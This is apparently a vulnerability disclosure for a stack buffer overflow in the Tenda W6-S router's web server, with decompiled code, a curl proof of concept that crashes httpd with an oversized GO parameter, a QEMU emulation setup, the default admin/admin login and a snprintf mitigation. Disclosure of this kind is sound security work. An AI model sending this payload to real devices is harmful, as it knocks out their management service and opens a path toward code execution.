# Tenda W6-S Stack Buffer Overflow in `/goform/wifiSSIDset` (GO Parameter)

**Vulnerability Type**: Stack-based Buffer Overflow
**Affected Product**: Tenda W6-S
**Firmware Version**: v1.0.0.4(510)
**Affected Component**: `/bin/httpd` – `formwrlSSIDset` function
**Endpoint**: `/goform/wifiSSIDset`
**Impact**: Denial of Service (httpd crash), potentially Remote Code Execution (requires authentication)
**Firmware Source**: https://www.tendacn.com/material/show/103478

------

## Description

The `formwrlSSIDset` function in the web server (`/bin/httpd`) of Tenda W6-S firmware version v1.0.0.4(510) contains a stack-based buffer overflow vulnerability. The function retrieves user-controlled parameters `GO` and `index` via `websGetVar`, then uses `sprintf` to copy them into a fixed 64-byte stack buffer (`v34`) without any length validation. By providing an excessively long `GO` parameter, an attacker can overflow the stack buffer, corrupting adjacent memory and causing the `httpd` process to crash. In certain scenarios, this may also be exploitable for arbitrary code execution.

------

## Technical Details

### Vulnerable Code (pseudo-code from IDA Pro)

```
char v34[64]; // stack buffer, 64 bytes

GO = (const char *)websGetVar(a1, "GO", "wireless_basic.asp");   // user-controlled
wl_radio = (char *)websGetVar(a1, "wl_radio", "0");
index = (char *)websGetVar(a1, "index", "0");                    // user-controlled

sprintf(v34, "/%s?index=%s", GO, index);  // <-- NO length restriction!
```



- `GO` – attacker-controlled string, no length check.
- `index` – attacker-controlled string, no length check.
- `v34` – stack buffer of only **64 bytes**.
- `sprintf` – writes formatted string into `v34` without boundary checking.

By sending a long `GO` value (e.g., 2000 'A' characters), the buffer is overflowed, overwriting the saved return address and other stack data, leading to a crash.

------

## Proof of Concept (PoC)

**Prerequisite**: The attacker must have valid credentials to access the web management interface (the endpoint requires authentication). Default credentials are `admin`/`admin`.

### Step 1: Log in to the web interface and obtain a valid session cookie (if required).

### Step 2: Send a crafted HTTP POST request to `/goform/wifiSSIDset`:

```
curl -s http://<device-ip>/goform/wifiSSIDset -d "GO=$(python3 -c "print('A'*2000)")&wl_radio=0&index=0"
```



### Step 3: Observe the httpd process crash

After the request, the httpd service crashes with a segmentation fault or becomes unresponsive, as shown in the following terminal output:

```
wl2g.ssid0.enable0wl2g.public.wl2g.extra.w_��wl2gw_��w]��wZ#�Cb�� hw_��w]�t��w]�4w_��w_��w]��wZ#�Cb�� hw_��w]�tw_��w]�4w_��w]��wZ#�Cb�� hw_��w]�t�Xw]�4��w_��� hw_��w]�HQ
[1] + Stopped (tty input)        /bin/httpd
```



This confirms that the overflow corrupts the stack and crashes the service.

------

## Environment Simulation (for Reproduction)

To reproduce this vulnerability, a QEMU-based simulation environment was set up using a MIPS system with a fake `apmib.so` library to bypass hardware initialization.

### 1. Fake [apmib.so](https://apmib.so/) – LD_PRELOAD Hook Library

A custom `fake_apmib.so` library was created to intercept and emulate hardware-dependent functions:

| Function                  | Return Value        | Purpose                                 |
| :------------------------ | :------------------ | :-------------------------------------- |
| `apmib_init()`            | 1                   | Skip hardware initialization            |
| `ConnectCfm()`            | 1                   | Skip connection to cfmd                 |
| `GetValue("lan.ip", ...)` | `192.168.5.10`      | Return static IP address                |
| `connect()`               | Success             | Unix socket and TCP connections succeed |
| `ioctl(SIOCGIFHWADDR)`    | `00:11:22:33:44:55` | Return fake MAC address                 |

### 2. Network Interface Setup (Host Machine)

```
# Create bridge interface
sudo brctl addbr virbr0
sudo ifconfig virbr0 192.168.5.1/24 up

# Create and configure TAP interface
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.5.11/24 up
sudo brctl addif virbr0 tap0
```



### 3. QEMU Startup Command

```
sudo qemu-system-mips -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet \
    -nographic
```



### 4. Guest VM Network Configuration

Inside the QEMU guest system:

```
ifconfig eth0 192.168.5.10
```



### 5. Transfer Firmware Files to Guest

```
# Copy the extracted firmware filesystem and fake library
scp ./squashfs-root.tar.gz root@192.168.5.10:/root/
scp ./fake_apmib.so root@192.168.5.10:/root/squashfs-root/
```



### 6. Chroot and Start httpd

Inside the QEMU guest:

```
# Mount required system directories
mount -o bind /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev

# Fix webroot symlink
rm /root/squashfs-root/webroot
ln -s /webroot_ro /root/squashfs-root/webroot

# Enter chroot environment
chroot ./squashfs-root/ /bin/sh

# Create required runtime directories
mkdir -p /var/run /tmp
chmod 1777 /tmp

# Start httpd with LD_PRELOAD hook
LD_PRELOAD=/fake_apmib.so /bin/httpd &
```



### 7. Access Web Interface

Once `httpd` is running, the web management interface is accessible at:

```
http://192.168.5.10
```



**Default Login Credentials**: `admin` / `admin`

------

## Root Cause

- The `GO` parameter is passed directly into `sprintf` without any length check.
- The destination buffer `v34` is only 64 bytes.
- No input sanitization or boundary checking is performed, allowing an attacker to write beyond the buffer limits.

------

## Impact

- **Denial of Service**: The `httpd` process crashes, making the web interface unavailable until the device is rebooted.
- **Potential Remote Code Execution**: With careful exploitation, this overflow could be leveraged to execute arbitrary code on the device.

------

## Recommended Mitigation

- Replace `sprintf` with `snprintf` and specify the correct buffer size.
- Validate and limit the length of all user-controlled input parameters (`GO`, `index`, etc.) before processing.
- Ensure that all `/goform/*` endpoints enforce proper authentication and input validation.

------

## Timeline

- **Discovery**: 2026-06-05

------

## Credits

- **Discoverer**: trister
- **Contact**: trister3146@gmail.com

------

## References

- Firmware Source: https://www.tendacn.com/material/show/103478